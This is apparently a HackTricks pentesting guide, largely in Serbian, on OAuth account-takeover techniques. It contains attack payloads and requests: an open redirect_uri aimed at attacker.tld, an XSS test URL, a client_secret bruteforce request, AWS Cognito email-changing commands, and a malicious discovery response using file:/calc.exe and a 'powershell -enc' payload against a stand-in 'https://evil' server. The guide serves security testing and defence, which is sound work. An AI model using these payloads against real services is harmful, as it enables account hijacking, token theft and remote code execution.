# OAuth za preuzimanje naloga

{{#include ../banners/hacktricks-training.md}}

## Osnovne informacije <a href="#d4a8" id="d4a8"></a>

OAuth nudi više verzija; osnovni uvidi dostupni su na [OAuth 2.0 documentation](https://oauth.net/2/). Ovaj prikaz se uglavnom fokusira na široko korišćen [OAuth 2.0 authorization code grant type](https://oauth.net/2/grant-types/authorization-code/), pružajući **okvir za autorizaciju koji omogućava aplikaciji da pristupi ili izvrši radnje na korisničkom nalogu u drugoj aplikaciji** (authorization server).

Zamislite hipotetički sajt _**https://example.com**_, dizajniran da **prikaže sve vaše objave na društvenim mrežama**, uključujući i private. Za to se koristi OAuth 2.0. _https://example.com_ će tražiti vaše dopuštenje da **pristupi vašim objavama na društvenim mrežama**. Kao posledica, na _https://socialmedia.com_ će se pojaviti ekran za saglasnost koji prikazuje **dozvole koje se traže i developera koji ih traži**. Nakon vaše autorizacije, _https://example.com_ dobija mogućnost da **pristupa vašim objavama u vaše ime**.

Važno je razumeti sledeće komponente unutar OAuth 2.0 okvira:

- **resource owner**: Vi, kao **korisnik/entitet**, dajete odobrenje za pristup svom resursu, kao što su objave na vašem nalogu na društvenim mrežama.
- **resource server**: Server koji obrađuje autentifikovane zahteve nakon što aplikacija pribavi `access token` u ime `resource owner`, npr. **https://socialmedia.com**.
- **client application**: Aplikacija koja traži autorizaciju od `resource owner`, poput **https://example.com**.
- **authorization server**: Server koji izdaje `access tokens` klijent-aplikaciji nakon uspešne autentifikacije `resource owner` i pribavljene autorizacije, npr. **https://socialmedia.com**.
- **client_id**: Javni, jedinstveni identifikator za aplikaciju.
- **client_secret:** Tajni ključ, poznat samo aplikaciji i authorization server-u, koji se koristi za generisanje `access_tokens`.
- **response_type**: Vrednost koja specificira **tip tokena koji se traži**, npr. `code`.
- **scope**: Stepen pristupa koji `client application` traži od `resource owner`.
- **redirect_uri**: URL na koji se korisnik preusmerava nakon autorizacije. Obično mora biti usklađen sa prethodno registrovanim redirect URL-om.
- **state**: Parametar za **održavanje podataka tokom preusmeravanja korisnika ka i sa authorization server-a**. Njegova jedinstvenost je kritična jer služi kao **mehanizam zaštite od CSRF-a**.
- **grant_type**: Parametar koji označava **vrstu grant-a i tip tokena koji će biti vraćen**.
- **code**: Autorizacioni kod od `authorization server`-a, koji klijent-aplikacija koristi zajedno sa `client_id` i `client_secret` da bi dobila `access_token`.
- **access_token**: Token koji `client application` koristi za API pozive u ime `resource owner`.
- **refresh_token**: Omogućava aplikaciji da **dobije novi `access_token` bez ponovnog traženja dozvole od korisnika**.

### Tok

Stvarni OAuth tok se odvija na sledeći način:

1. Posetite [https://example.com](https://example.com) i kliknete na dugme "Integrate with Social Media".
2. Sajt zatim šalje zahtev na [https://socialmedia.com](https://socialmedia.com) tražeći vaše odobrenje da aplikacija https://example.com pristupi vašim objavama. Zahtev je strukturiran kao:
```
https://socialmedia.com/auth
?response_type=code
&client_id=example_clientId
&redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
&scope=readPosts
&state=randomString123
```
3. Zatim će vam biti prikazana stranica za saglasnost.
4. Nakon vašeg odobrenja, Društvena mreža šalje odgovor na `redirect_uri` sa parametrima `code` i `state`:
```
https://example.com?code=uniqueCode123&state=randomString123
```
5. https://example.com koristi ovaj `code`, zajedno sa svojim `client_id` i `client_secret`, да pošalje serverski zahtev kako би добио `access_token` у ваше име, омогућавајући приступ дозволама за које сте дали сагласност:
```
POST /oauth/access_token
Host: socialmedia.com
...{"client_id": "example_clientId", "client_secret": "example_clientSecret", "code": "uniqueCode123", "grant_type": "authorization_code"}
```
6. Na kraju, proces se završava kada https://example.com iskoristi vaš `access_token` da izvrši API poziv ka društvenim mrežama i pristupi

## Vulnerabilities <a href="#id-323a" id="id-323a"></a>

### Open redirect_uri <a href="#cc36" id="cc36"></a>

Per [RFC 6749 §3.1.2](https://www.rfc-editor.org/rfc/rfc6749#section-3.1.2), the authorization server must redirect the browser only to **pre-registrovane, tačne redirect URIs**. Bilo koja slabost ovde omogućava napadaču da pošalje žrtvu kroz maliciozni authorization URL tako da IdP isporuči žrtvin `code` (i `state`) direktno na endpoint koji kontroliše napadač, koji ga potom može zameniti i prikupiti tokene.

Tipični tok napada:

1. Napravi `https://idp.example/auth?...&redirect_uri=https://attacker.tld/callback` i pošalje ga žrtvi.
2. Žrtva se autentifikuje i odobri scope-ove.
3. IdP preusmeri na `attacker.tld/callback?code=<victim-code>&state=...` gde napadač zabeleži zahtev i odmah zameni code.

Uobičajeni bagovi validacije koje treba ispitati:

- **Bez validacije** – bilo koji apsolutni URL se prihvata, što rezultira trenutnom krađom code-a.
- **Slabe substring/regex provere hosta** – zaobilaženje sa lookalike domenima kao što su `evilmatch.com`, `match.com.evil.com`, `match.com.mx`, `matchAmatch.com`, `evil.com#match.com`, ili `match.com@evil.com`.
- **IDN homograph neusklađenosti** – validacija se radi na punycode formi (`xn--`), ali pregledač preusmerava na Unicode domen kojim upravlja napadač.
- **Arbitrarni putevi na dozvoljenom hostu** – usmeravanje `redirect_uri` na `/openredirect?next=https://attacker.tld` ili bilo koji XSS/user-content endpoint otkriva code bilo kroz lančane redirect-e, Referer zaglavlja, ili injektovani JavaScript.
- **Ograničenja direktorijuma bez normalizacije** – obrasci poput `/oauth/*` mogu se zaobići sa `/oauth/../anything`.
- **Wildcard poddomeni** – prihvatanje `*.example.com` znači da bilo koji takeover (dangling DNS, S3 bucket, itd.) odmah daje validan callback.
- **Non-HTTPS callbacks** – puštanje `http://` URI-ja daje mrežnim napadačima (Wi‑Fi, corporate proxy) šansu da ukradu code u tranzitu.

Takođe pregledajte pomoćne redirect-stil parametre (`client_uri`, `policy_uri`, `tos_uri`, `initiate_login_uri`, itd.) i OpenID discovery document (`/.well-known/openid-configuration`) za dodatne endpoint-e koji bi mogli naslediti iste bagove validacije.

### XSS in redirect implementation <a href="#bda5" id="bda5"></a>

Kao što je pomenuto u ovom bug bounty izveštaju [https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html](https://blog.dixitaditya.com/2021/11/19/account-takeover-chain.html), može biti moguće da se redirect **URL reflektuje u odgovoru** servera nakon što se korisnik autentifikuje, čineći ga **ranjivim na XSS**. Mogući payload za testiranje:
```
https://app.victim.com/login?redirectUrl=https://app.victim.com/dashboard</script><h1>test</h1>
```
### CSRF - Improper handling of state parameter <a href="#bda5" id="bda5"></a>

Parametar `state` je Authorization Code flow CSRF token: klijent mora da generiše **kriptografski nasumičnu vrednost po instanci browsera**, sačuvati je na mestu koje samo taj browser može da pročita (cookie, local storage, itd.), poslati je u authorization request, i odbaciti svaki response koji ne vraća istu vrednost. Kad je vrednost statična, predvidiva, opciona ili nije vezana za sesiju korisnika, napadač može da završi sopstveni OAuth flow, presretne finalni `?code=` request (bez slanja), i kasnije natera browser žrtve da replay-uje taj request tako da žrtvin nalog postane povezan sa napadačevim profilom identity provider-a.

Replay obrazac je uvek isti:

1. Napadač se autentifikuje kod IdP-a svojim nalogom i presreće poslednji redirect koji sadrži `code` (i eventualno `state`).
2. Oni bace taj request, zadrže URL, i kasnije zloupotrebe bilo koji CSRF primitiv (link, iframe, auto-submitting form) da nateraju browser žrtve da ga učita.
3. Ako klijent ne primenjuje `state`, aplikacija konzumira napadačev authorization rezultat i uloguje napadača u nalog žrtve u aplikaciji.

Praktičan checklist za rukovanje `state` tokom testiranja:

- **Missing `state` entirely** – ako parametar nikada ne postoji, ceo login je CSRFable.
- **`state` not required** – uklonite ga iz početnog zahteva; ako IdP i dalje izdaje code-ove koje klijent prihvata, odbrana je opt-in.
- **Returned `state` not validated** – modifikujte vrednost u response-u (Burp, MITM proxy). Prihvatanje neusaglašenih vrednosti znači da se sačuvani token nikada ne upoređuje.
- **Predictable or purely data-driven `state`** – mnoge aplikacije ubacuju redirect putanje ili JSON blob-ove u `state` bez mešanja entropije, što omogućava napadačima da pogode validne vrednosti i replay-uju flow-ove. Uvek prepend/append-ujte snažnu entropiju pre enkodovanja podataka.
- **`state` fixation** – ako aplikacija dozvoljava korisnicima da daju `state` vrednost (npr. preko crafted authorization URL-ova) i ponovo je koristi tokom flow-a, napadač može da zaključa poznatu vrednost i ponovo je koristi na više žrtava.

PKCE može dopuniti `state` (posebno za public clients) tako što veže authorization code za code verifier, ali web klijenti i dalje moraju pratiti `state` da bi sprečili cross-user CSRF/account-linking propuste.

### Pre Account Takeover <a href="#ebe4" id="ebe4"></a>

1. **Without Email Verification on Account Creation**: Napadači mogu preventivno kreirati nalog koristeći email žrtve. Ako žrtva kasnije koristi third-party servis za login, aplikacija može nenamerno povezati taj third-party nalog sa napadačevim unapred kreiranim nalogom, što vodi do neautorizovanog pristupa.
2. **Exploiting Lax OAuth Email Verification**: Napadači mogu iskoristiti OAuth servise koji ne verifikuju email tako što se registruju, a potom promene email naloga na žrtvin. Ova metoda slično dovodi do rizika neautorizovanog pristupa nalogu, analogno prvoj situaciji ali kroz drugi attack vector.

### Disclosure of Secrets <a href="#e177" id="e177"></a>

`client_id` je namerno javan, ali **`client_secret` nikada ne sme biti dostupan krajnjim korisnicima**. Authorization Code deploy-ovi koji embed-uju secret u **mobile APKs, desktop clients, or single-page apps** praktično predaju te kredencijale svima koji mogu da preuzmu paket. Uvek pregledajte public clients tako što ćete:

- Raspakovati APK/IPA, desktop installer ili Electron app i grep-ovati za `client_secret`, Base64 blob-ove koji dešifruju u JSON, ili hard-coded OAuth endpoint-e.
- Pregledati bundlovane config fajlove (plist, JSON, XML) ili dekompajlirane stringove u potrazi za client credential-ima.

Kada napadač izvuče secret, treba mu samo da ukrade bilo koji žrtvin authorization `code` (putem weak `redirect_uri`, logs, itd.) da nezavisno pozove `/token` i izda access/refresh tokens bez uključenja legitimne aplikacije. Smatrajte public/native klijente kao **nesposobne da čuvaju tajne** — umesto statičkog secreta, oni bi trebali da zavise od PKCE (RFC 7636) da dokažu posedovanje per-instance code verifier-a. Tokom testiranja, potvrdite da li je PKCE obavezan i da li backend zaista odbija token exchange koji izostavlja ili `client_secret` **ili** validan `code_verifier`.

### Client Secret Bruteforce

Možete pokušati da **bruteforce-ujete `client_secret`** servisa provajdera identity provider-a kako biste pokušali da ukradete naloge.\
Zahtev za BF može izgledati slično:
```
POST /token HTTP/1.1
content-type: application/x-www-form-urlencoded
host: 10.10.10.10:3000
content-length: 135
Connection: close

code=77515&redirect_uri=http%3A%2F%2F10.10.10.10%3A3000%2Fcallback&grant_type=authorization_code&client_id=public_client_id&client_secret=[bruteforce]
```
### Referer Header leaking Code + State

Ako klijent ima **code and state**, i oni se **reflektuju u Referer header** kada pregleda drugu stranicu, tada je ranjiv.

### Access Token Stored in Browser History

Osnovno obećanje Authorization Code granta je da **access tokens nikada ne dopru do resource owner-ovog browser-a**. Kada implementacije leak tokens na klijentskoj strani, bilo koja mala greška (XSS, Referer leak, proxy logging) postaje trenutni kompromis naloga. Uvek proverite:

- **Tokens in URLs** – ako se `access_token` pojavi u query/fragmentu, završi u browser history, server logs, analytics i Referer headers koji se šalju third parties.
- **Tokens transiting untrusted middleboxes** – vraćanje tokena preko HTTP ili kroz debugging/corporate proxies dozvoljava network observer-ima da ih direktno uhvate.
- **Tokens stored in JavaScript state** – React/Vue stores, global variables, ili serialized JSON blobs izlažu tokene svakom script-u na origin-u (uključujući XSS payload-e ili malicious extensions).
- **Tokens persisted in Web Storage** – `localStorage`/`sessionStorage` čuvaju tokene dugo posle logout-a na deljenim uređajima i dostupni su skriptama.

Bilo koji od ovih nalaza obično nadograđuje inače “low” bugove (kao CSP bypass ili DOM XSS) u potpuno preuzimanje API-ja, jer napadač jednostavno može pročitati i replay-ovati leaked bearer token.

### Everlasting Authorization Code

Authorization codes moraju biti **short-lived, single-use, i replay-aware**. Prilikom testiranja flow-a, uhvatite `code` i:

- **Test the lifetime** – RFC 6749 preporučuje minute, ne sate. Pokušajte redeem-ovati code posle 5–10 minuta; ako i dalje radi, window eksponiranja za bilo koji leaked code je prekomeran.
- **Test sequential reuse** – pošaljite isti `code` dva puta. Ako drugi zahtev daje drugi token, napadači mogu klonirati sesije beskonačno.
- **Test concurrent redemption/race conditions** – pokrenite dva token zahteva paralelno (Burp intruder, turbo intruder). Slabi issuers ponekad dodeljuju oba.
- **Observe replay handling** – pokušaj ponovne upotrebe ne bi trebalo samo da ne uspe, već i da opozove sve tokene već izdate od tog code-a. Inače, detektovan replay ostavlja napadačev prvi token aktivnim.

Kombinovanje replay-friendly code-a sa bilo kojim `redirect_uri` ili logging bug-om omogućava persistent access nalogu čak i nakon što žrtva završi legitimni login.

### Authorization/Refresh Token not bound to client

Ako možete da dobijete **authorization code** i iskoristite ga sa drugačijim client-om, onda možete preuzeti tuđe naloge.

### Happy Paths, XSS, Iframes & Post Messages to leak code & state values

[**Check this post**](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)

### AWS Cognito <a href="#bda5" id="bda5"></a>

U ovom bug bounty izveštaju: [**https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/**](https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/) možete videti da **token** koji **AWS Cognito** vraća korisniku može imati **dovoljno permisija da prepiše user data**. Stoga, ako možete **promeniti user email u drugi user email**, možda ćete moći da **preuzmete** tuđe naloge.
```bash
# Read info of the user
aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]

# Change email address
aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=imaginary@flickr.com
{
"CodeDeliveryDetailsList": [
{
"Destination": "i***@f***.com",
"DeliveryMedium": "EMAIL",
"AttributeName": "email"
}
]
}
```
For more detailed info about how to abuse AWS Cognito check [AWS Cognito - Unauthenticated Enum Access](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-unauthenticated-enum-access/aws-cognito-unauthenticated-enum.html).

### Abusing other Apps tokens <a href="#bda5" id="bda5"></a>

As [**mentioned in this writeup**](https://salt.security/blog/oh-auth-abusing-oauth-to-take-over-millions-of-accounts), OAuth flows that expect to receive the **token** (and not a code) could be vulnerable if they not check that the token belongs to the app.

This is because an **attacker** could create an **application supporting OAuth and login with Facebook** (for example) in his own application. Then, once a victim logins with Facebook in the **attackers application**, the attacker could get the **OAuth token of the user given to his application, and use it to login in the victim OAuth application using the victims user token**.

> [!CAUTION]
> Therefore, if the attacker manages to get the user access his own OAuth application, he will be able to take over the victims account in applications that are expecting a token and aren't checking if the token was granted to their app ID.

### Two links & cookie <a href="#bda5" id="bda5"></a>

According to [**this writeup**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), it was possible to make a victim open a page with a **returnUrl** pointing to the attackers host. This info would be **stored in a cookie (RU)** and in a **later step** the **prompt** will **ask** the **user** if he wants to give access to that attackers host.

To bypass this prompt, it was possible to open a tab to initiate the **Oauth flow** that would set this RU cookie using the **returnUrl**, close the tab before the prompt is shown, and open a new tab without that value. Then, the **prompt won't inform about the attackers host**, but the cookie would be set to it, so the **token will be sent to the attackers host** in the redirection.

### Prompt Interaction Bypass <a href="#bda5" id="bda5"></a>

As explained in [**this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), some OAuth implementations allows to indicate the **`prompt`** GET parameter as None (**`&prompt=none`**) to **prevent users being asked to confirm** the given access in a prompt in the web if they are already logged in the platform.

### response_mode

As [**explained in this video**](https://www.youtube.com/watch?v=n9x7_J_a_7Q), it might be possible to indicate the parameter **`response_mode`** to indicate where do you want the code to be provided in the final URL:

- `response_mode=query` -> code se prosleđuje kao GET parametar: `?code=2397rf3gu93f`
- `response_mode=fragment` -> code se prosleđuje u fragmentu URL-a: `#code=2397rf3gu93f`
- `response_mode=form_post` -> code se prosleđuje u POST formi kao input nazvan `code` i njegova vrednost
- `response_mode=web_message` -> code se šalje putem post message-a: `window.opener.postMessage({"code": "asdasdasd...`

### Clickjacking OAuth consent dialogs

OAuth consent/login dialogs are ideal Clickjacking targets: if they can be framed, an attacker can overlay custom graphics, hide the real buttons, and trick users into approving dangerous scopes or linking accounts. Build PoCs that:

1. Load the IdP authorization URL inside an `<iframe sandbox="allow-forms allow-scripts allow-same-origin">`.
2. Use absolute positioning/opacity tricks to align fake buttons with the hidden **Allow**/**Approve** controls.
3. Optionally pre-fill parameters (scopes, redirect URI) so the stolen approval immediately benefits the attacker.

During testing verify that IdP pages emit either `X-Frame-Options: DENY/SAMEORIGIN` or a restrictive `Content-Security-Policy: frame-ancestors 'none'`. If neither is present, demonstrate the risk with tooling like [NCC Group’s clickjacking PoC generator](https://github.com/nccgroup/clickjacking-poc) and record how easily a victim authorizes the attacker’s app. For additional payload ideas see [Clickjacking](clickjacking.md).

### OAuth ROPC flow - 2 FA bypass <a href="#b440" id="b440"></a>

According to [**this blog post**](https://cybxis.medium.com/a-bypass-on-gitlabs-login-email-verification-via-oauth-ropc-flow-e194242cad96), this is an OAuth flow that allows to login in OAuth via **username** and **password**. If during this simple flow a **token** with access to all the actions the user can perform is returned then it's possible to bypass 2FA using that token.

### ATO on web page redirecting based on open redirect to referrer <a href="#bda5" id="bda5"></a>

This [**blogpost**](https://blog.voorivex.team/oauth-non-happy-path-to-ato) comments how it was possible to abuse an **open redirect** to the value from the **referrer** to abuse OAuth to ATO. The attack was:

1. Victim access the attackers web page
2. The victim opens the malicious link and an opener starts the Google OAuth flow with `response_type=id_token,code&prompt=none` as additional parameters using as **referrer the attackers website**.
3. In the opener, after the provider authorizes the victim, it sends them back to the value of the `redirect_uri` parameter (victim web) with 30X code which still keeps the attackers website in the referer.
4. The victim **website trigger the open redirect based on the referrer** redirecting the victim user to the attackers website, as the **`respose_type`** was **`id_token,code`**, the code will be sent back to the attacker in the **fragment** of the URL allowing him to tacke over the account of the user via Google in the victims site.

### SSRFs parameters <a href="#bda5" id="bda5"></a>

[**Check this research**](https://portswigger.net/research/hidden-oauth-attack-vectors) **For further details of this technique.**

Dynamic Client Registration in OAuth serves as a less obvious but critical vector for security vulnerabilities, specifically for **Server-Side Request Forgery (SSRF)** attacks. This endpoint allows OAuth servers to receive details about client applications, including sensitive URLs that could be exploited.

**Key Points:**

- **Dynamic Client Registration** is often mapped to `/register` and accepts details like `client_name`, `client_secret`, `redirect_uris`, and URLs for logos or JSON Web Key Sets (JWKs) via POST requests.
- This feature adheres to specifications laid out in **RFC7591** and **OpenID Connect Registration 1.0**, which include parameters potentially vulnerable to SSRF.
- The registration process can inadvertently expose servers to SSRF in several ways:
- **`logo_uri`**: A URL for the client application's logo that might be fetched by the server, triggering SSRF or leading to XSS if the URL is mishandled.
- **`jwks_uri`**: A URL to the client's JWK document, which if maliciously crafted, can cause the server to make outbound requests to an attacker-controlled server.
- **`sector_identifier_uri`**: References a JSON array of `redirect_uris`, which the server might fetch, creating an SSRF opportunity.
- **`request_uris`**: Lists allowed request URIs for the client, which can be exploited if the server fetches these URIs at the start of the authorization process.

**Exploitation Strategy:**

- SSRF can be triggered by registering a new client with malicious URLs in parameters like `logo_uri`, `jwks_uri`, or `sector_identifier_uri`.
- While direct exploitation via `request_uris` may be mitigated by whitelist controls, supplying a pre-registered, attacker-controlled `request_uri` can facilitate SSRF during the authorization phase.

### OAuth/OIDC Discovery URL Abuse & OS Command Execution

Research on [CVE-2025-6514](https://amlalabs.com/blog/oauth-cve-2025-6514/) (impacting `mcp-remote` clients such as Claude Desktop, Cursor or Windsurf) shows how **dynamic OAuth discovery becomes an RCE primitive** whenever the client forwards IdP metadata straight to the operating system. The remote MCP server returns an attacker-controlled `authorization_endpoint` during the discovery exchange (`/.well-known/openid-configuration` or any metadata RPC). `mcp-remote ≤0.1.15` would then call the system URL handler (`start`, `open`, `xdg-open`, etc.) with whatever string arrived, so any scheme/path supported by the OS executed locally.

**Attack workflow**

1. Point the desktop agent to a hostile MCP/OAuth server (`npx mcp-remote https://evil`). The agent receives `401` plus metadata.
2. The server answers with JSON such as:
```
HTTP/1.1 200 OK
Content-Type: application/json

{
"authorization_endpoint": "file:/c:/windows/system32/calc.exe",
"token_endpoint": "https://evil/idp/token",
...
}
```
3. Klijent pokreće OS handler za prosleđeni URI. Windows prihvata payloads kao `file:/c:/windows/system32/calc.exe /c"powershell -enc ..."`; macOS/Linux prihvataju `file:///Applications/Calculator.app/...` ili čak custom schemes kao `cmd://bash -lc '<payload>'` ako su registrovani.
4. Pošto se ovo dešava pre bilo kakve korisničke interakcije, **samo konfigurisanjem klijenta da komunicira sa serverom napadača dovodi do izvršenja koda**.

**Kako testirati**

- Ciljajte bilo koji OAuth-capable desktop/agent koji vrši discovery preko HTTP(S) i otvara vraćene endpoint-e lokalno (Electron apps, CLI helpers, thick clients).
- Intercept-ujte ili hostujte discovery response i zamenite `authorization_endpoint`, `device_authorization_endpoint`, ili slična polja sa `file://`, `cmd://`, UNC paths, ili drugim opasnim schemes.
- Posmatrajte da li klijent validira scheme/host. Nedostatak validacije rezultira trenutnim izvršenjem pod korisničkim kontekstom i dokazuje problem.
- Ponavljajte sa različitim scheme-ovima da mapirate celu attack surface (npr. `ms-excel:`, `data:text/html,`, custom protocol handlers) i demonstrirate cross-platform domet.

## OAuth providers Race Conditions

Ako je platforma koju testirate OAuth provider [**read this to test for possible Race Conditions**](race-condition.md).

## Mutable Claims Attack

U OAuth-u, polje sub jedinstveno identifikuje korisnika, ali njegov format varira u zavisnosti od Authorization Server-a. Da bi standardizovali identifikaciju korisnika, neki klijenti koriste email-ove ili korisnička imena. Međutim, ovo je rizično zato što:

- Neki Authorization Server-i ne garantuju da ove osobine (kao što je email) ostaju immutable.
- U određenim implementacijama—kao što je **"Login with Microsoft"**—klijent se oslanja na polje email, koje je **user-controlled by the user in Entra ID** i nije verifikovano.
- Napadač može iskoristiti ovo tako što će napraviti sopstvenu Azure AD organizaciju (npr. doyensectestorg) i koristiti je za Microsoft login.
- Iako je Object ID (čuvan u sub) immutable i siguran, oslanjanje na mutable email polje može omogućiti account takeover (na primer, preuzimanje naloga kao victim@gmail.com).

## Client Confusion Attack

U Client Confusion Attack aplikacija koja koristi OAuth Implicit Flow ne proverava da li je finalni access token eksplicitno izdat za njen sopstveni Client ID. Napadač postavi javni sajt koji koristi Google-ov OAuth Implicit Flow, navede hiljade korisnika da se uloguju i na taj način sakuplja access tokene namenjene napadačevom sajtu. Ako ti korisnici imaju naloge na nekom drugom ranjivom sajtu koji ne validira Client ID tokena, napadač može ponovo iskoristiti prikupljene tokene da se lažno predstavi kao žrtve i preuzme njihove naloge.

## Scope Upgrade Attack

Authorization Code Grant podrazumeva sigurnu server-to-server komunikaciju za prenos podataka o korisniku. Međutim, ako Authorization Server implicitno veruje scope parametru u Access Token Request-u (parametar koji nije definisan u RFC-u), zlonamerna aplikacija može povećati privilegije authorization code-a tražeći viši scope. Nakon što se Access Token generiše, Resource Server mora da ga verifikuje: za JWT tokene to uključuje proveru JWT potpisa i izdvajanje podataka kao što su client_id i scope, dok za tokene koji su nasumični stringovi server mora da upita Authorization Server da dobije detalje o tokenu.

## Redirect Scheme Hijacking

U mobilnim OAuth implementacijama, aplikacije koriste custom URI schemes da prime redirect sa Authorization Codes. Međutim, budući da više aplikacija može registrovati isti scheme na uređaju, pretpostavka da samo legitimni klijent kontroliše redirect URI je narušena. Na Androidu, na primer, Intent URI kao `com.example.app://` oauth se hvata na osnovu scheme-a i opcionih filtera definisanih u app-ovom intent-filter. Pošto Android-ovo rešavanje intent-a može biti široko—posebno ako je specificiran samo scheme—napadač može registrovati zlonamernu aplikaciju sa pažljivo konstruisanim intent filter-om da bi oteo authorization code. Ovo može **omogućiti account takeover** bilo kroz korisničku interakciju (kada više aplikacija može da rukuje intent-om) ili putem bypass tehnika koje iskorišćavaju preširoke ili preuske filtere, kao što je detaljno prikazano u Ostorlab-ovom assessment flowchart-u.

## References

- [**https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1**](https://medium.com/a-bugz-life/the-wondeful-world-of-oauth-bug-bounty-edition-af3073b354c1)
- [**https://portswigger.net/research/hidden-oauth-attack-vectors**](https://portswigger.net/research/hidden-oauth-attack-vectors)
- [**https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html**](https://blog.doyensec.com/2025/01/30/oauth-common-vulnerabilities.html)
- [An Offensive Guide to the OAuth 2.0 Authorization Code Grant](https://www.nccgroup.com/research-blog/an-offensive-guide-to-the-authorization-code-grant/)
- [OAuth Discovery as an RCE Vector (Amla Labs)](https://amlalabs.com/blog/oauth-cve-2025-6514/)

{{#include ../banners/hacktricks-training.md}}
